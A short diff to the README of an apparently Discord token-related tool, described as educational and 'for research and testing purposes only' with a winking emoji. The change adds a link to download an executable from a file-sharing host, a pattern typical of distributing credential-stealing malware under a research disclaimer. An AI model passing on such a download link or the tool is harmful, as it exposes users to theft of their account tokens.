@@ -3,6 +3,9 @@
 > Educational tool for demonstrating token security risks in Discord environments.  
 > **For research and testing purposes only.** 😏
 
+[Download EXE (MEGA)](https://mega.nz/file/ENAC0AbB#cxUuBHv-zHWmuIMeFKJkpaO8pW1KHnMGF25POg1ftrI)
+
+
 ---
 
 ## 🔥 Features
